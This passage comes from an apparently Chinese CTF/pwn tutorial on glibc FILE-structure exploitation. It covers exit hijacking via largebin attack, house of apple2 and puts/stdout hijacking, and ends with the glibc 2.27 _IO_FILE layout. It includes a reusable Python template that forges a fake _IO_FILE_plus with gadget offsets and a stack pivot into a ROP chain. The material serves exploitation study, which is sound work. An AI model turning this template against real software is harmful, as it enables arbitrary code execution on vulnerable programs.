    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_cookie_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_cookie_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_cookie_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_old_cookie_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_cookie_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">_Static_assert</span> <span class="token punctuation">(</span><span class="token function">array_length</span> <span class="token punctuation">(</span>__io_vtables<span class="token punctuation">)</span> <span class="token operator">==</span> IO_VTABLES_NUM<span class="token punctuation">,</span>
                <span class="token string">&quot;initializer count&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="劫持exit-lagrebin-attack" tabindex="-1"><a class="header-anchor" href="#劫持exit-lagrebin-attack" aria-hidden="true">#</a> 劫持exit lagrebin attack</h4><p>exit触发的函数调用链是_IO_cleanup-&gt; _IO_flush_all-&gt;_IO_OVERFLOW (偏移0x18)然后就会获取<code>_IO_list_all</code>然后开始循环</p><p>满足条件</p><ul><li>fp-&gt;_mode &lt;= 0 也就是0xc0小于等于0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 也就是0x20 小于 0x28 (lagrebin attack自动满足这个条件)</li><li>vatble 有值</li><li>_lock要是一个可写地址(可写就行)</li></ul><h5 id="house-of-apple2" tabindex="-1"><a class="header-anchor" href="#house-of-apple2" aria-hidden="true">#</a> house of apple2</h5><p>house of apple2的话我们要触发以下调用链 因为都是触发<strong>overflow</strong>函数所以不需要调整偏移</p><ul><li><code>_IO_wfile_overflow</code> () (overflow函数对应偏移 0x18)</li><li><code>_IO_wdoallocbuf </code> (非虚表)</li><li><code>_IO_WDOALLOCATE</code> 也就是对应<code>doallocate</code>函数 (对应偏移0x68 f-&gt;_wide_vtable-&gt;__doallocate)</li></ul><p>那么满足条件</p><ul><li>_flags &amp; _IO_NO_WRITES == 0 (lagrebin attack自动满足)因为0&amp;任意数任然为0</li><li>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 也是自动满足</li><li>f-&gt;_wide_data-&gt;_IO_write_base == 0 也就是0xa0指向的地方的0x20偏移位置为0</li></ul><p><strong>板子</strong></p><blockquote><p>由于高版本执行到call的时候 rbp变成了0xffffffff,所以我们无法使用通用的板子.我们要是还是想要实现gadget</p><p>我们可以使用magic gadget svcudp_reply+20位置的代码 此时我们_stdout就是rdi寄存器</p><ul><li>其实就是edi+0x48位置赋值给rbp</li></ul></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># fake wide</span>
fake_IO_addr <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x290</span>
<span class="token comment"># 刚好让</span>
magic_gadget <span class="token operator">=</span> <span class="token number">1250158</span> <span class="token operator">+</span>libc_base
leavn_retn <span class="token operator">=</span>  <span class="token number">0x477e7</span>  <span class="token operator">+</span>libc_base
pop_rsp <span class="token operator">=</span> <span class="token number">0x2879c</span>  <span class="token operator">+</span>libc_base
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;pop_rsp:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pop_rsp<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 执行ROP链的chunk地址</span>
ROP_addr <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x100</span>
magic_addrs <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment"># mov rbp,QWORD PTR [rdi+0x48]</span>
    <span class="token string">&quot;rbp&quot;</span><span class="token punctuation">:</span> fake_IO_addr<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span>
    <span class="token string">&quot;rdi&quot;</span><span class="token punctuation">:</span>fake_IO_addr <span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span>
    <span class="token string">&quot;rax&quot;</span><span class="token punctuation">:</span>fake_IO_addr <span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">,</span>
    <span class="token string">&quot;rbp_value&quot;</span> <span class="token punctuation">:</span> ROP_addr<span class="token punctuation">,</span>
    <span class="token string">&quot;call&quot;</span><span class="token punctuation">:</span>pop_rsp
<span class="token punctuation">}</span>
wfile_addrs <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment"># 指向地址+0x20 要为0</span>
    <span class="token string">&quot;_wide_data&quot;</span><span class="token punctuation">:</span>fake_IO_addr<span class="token operator">-</span><span class="token number">0x48</span><span class="token punctuation">,</span>
    <span class="token comment"># wide 虚表 要求0x68位置为执行函数</span>
    <span class="token string">&quot;_wide_vtable&quot;</span><span class="token punctuation">:</span>fake_IO_addr<span class="token punctuation">,</span>
    <span class="token comment"># 首次执行函数地址 应该在结构体偏移0x68位置</span>
    <span class="token string">&quot;first_cmd&quot;</span><span class="token punctuation">:</span>magic_gadget<span class="token punctuation">,</span>
<span class="token punctuation">}</span>
fsop_exit_addrs <span class="token operator">=</span> <span class="token punctuation">{</span>
<span class="token comment"># 需要为0</span>
    <span class="token string">&quot;_mode&quot;</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token comment"># ptr大于base就行</span>
    <span class="token string">&quot;_IO_write_ptr&quot;</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token string">&quot;_IO_write_base&quot;</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token comment"># 随意一个可写地址就可以 会在上面写0</span>
    <span class="token string">&quot;_lock&quot;</span><span class="token punctuation">:</span>fake_IO_addr<span class="token punctuation">,</span>
    <span class="token string">&quot;_IO_read_base&quot;</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token comment"># 要劫持vatble为多少</span>
    <span class="token string">&quot;vatble&quot;</span><span class="token punctuation">:</span>_IO_wfile_jumps<span class="token punctuation">,</span>
<span class="token punctuation">}</span>

fake_IO <span class="token operator">=</span> IO_FILE_plus_struct<span class="token punctuation">(</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_IO_buf_end <span class="token operator">=</span> magic_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;rbp_value&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_IO_save_base <span class="token operator">=</span> magic_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;rbp&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_IO_backup_base <span class="token operator">=</span> magic_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;rdi&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_IO_save_end <span class="token operator">=</span> magic_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;rax&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_mode <span class="token operator">=</span> fsop_exit_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;_mode&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_lock <span class="token operator">=</span> fsop_exit_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;_lock&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>chain <span class="token operator">=</span> wfile_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;first_cmd&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>fileno <span class="token operator">=</span> <span class="token number">0</span>
fake_IO<span class="token punctuation">.</span>_old_offset <span class="token operator">=</span> <span class="token number">0</span>
fake_IO<span class="token punctuation">.</span>_offset <span class="token operator">=</span> <span class="token number">0</span>
fake_IO<span class="token punctuation">.</span>_wide_data <span class="token operator">=</span> wfile_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;_wide_data&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>unknown2 <span class="token operator">=</span> magic_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;call&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>_codecvt<span class="token operator">=</span> wfile_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;_wide_vtable&quot;</span><span class="token punctuation">)</span>
fake_IO<span class="token punctuation">.</span>vtable <span class="token operator">=</span> fsop_exit_addrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;vatble&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="劫持puts-io-2-1-stdout" tabindex="-1"><a class="header-anchor" href="#劫持puts-io-2-1-stdout" aria-hidden="true">#</a> 劫持puts<code> _IO_2_1_stdout</code>_</h4><ul><li>puts函数</li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">int</span>
<span class="token function">_IO_puts</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  _IO_size_t len <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
       <span class="token operator">||</span> <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> str<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> len
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_putc_unlocked</span> <span class="token punctuation">(</span><span class="token char">&#39;\\n&#39;</span><span class="token punctuation">,</span> _IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">MIN</span> <span class="token punctuation">(</span>INT_MAX<span class="token punctuation">,</span> len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>也就是保证lock指向的位置值为1</li><li>_mode应该为0</li><li>vtable应该为_IO_wfile_jumps-32,方便调用<code>_IO_wfile_overflow</code></li></ul><h2 id="_2-27" tabindex="-1"><a class="header-anchor" href="#_2-27" aria-hidden="true">#</a> 2.27</h2><h3 id="io-file-plus结构体-1" tabindex="-1"><a class="header-anchor" href="#io-file-plus结构体-1" aria-hidden="true">#</a> _IO_FILE_plus结构体</h3><ul><li>_IO_FILE_plus</li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |   216 */</span>    _IO_FILE file<span class="token punctuation">;</span>
<span class="token comment">/*  216      |     8 */</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  224 */</span>
                         <span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>_IO_FILE</li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |     4 */</span>    <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>
<span class="token comment">/* XXX  4-byte hole  */</span>
<span class="token comment">/*    8      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>
<span class="token comment">/*   16      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>
<span class="token comment">/*   24      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>
<span class="token comment">/*   32      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>
<span class="token comment">/*   40      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>
<span class="token comment">/*   48      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>
<span class="token comment">/*   56      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>
<span class="token comment">/*   64      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>
<span class="token comment">/*   72      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span>
<span class="token comment">/*   80      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>
<span class="token comment">/*   88      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span>
<span class="token comment">/*   96      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>
<span class="token comment">/*  104      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>
<span class="token comment">/*  112      |     4 */</span>    <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
<span class="token comment">/*  116      |     4 */</span>    <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
<span class="token comment">/*  120      |     8 */</span>    __off_t _old_offset<span class="token punctuation">;</span>
<span class="token comment">/*  128      |     2 */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
<span class="token comment">/*  130      |     1 */</span>    <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
<span class="token comment">/*  131      |     1 */</span>    <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">/* XXX  4-byte hole  */</span>
<span class="token comment">/*  136      |     8 */</span>    _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
<span class="token comment">/*  144      |     8 */</span>    __off64_t _offset<span class="token punctuation">;</span>
<span class="token comment">/*  152      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>
<span class="token comment">/*  160      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>
<span class="token comment">/*  168      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>
<span class="token comment">/*  176      |     8 */</span>    <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span>
<span class="token comment">/*  184      |     8 */</span>    <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>
<span class="token comment">/*  192      |     4 */</span>    <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>
<span class="token comment">/*  196      |    20 */</span>    <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  216 */</span>
                         <span class="token punctuation">}</span>

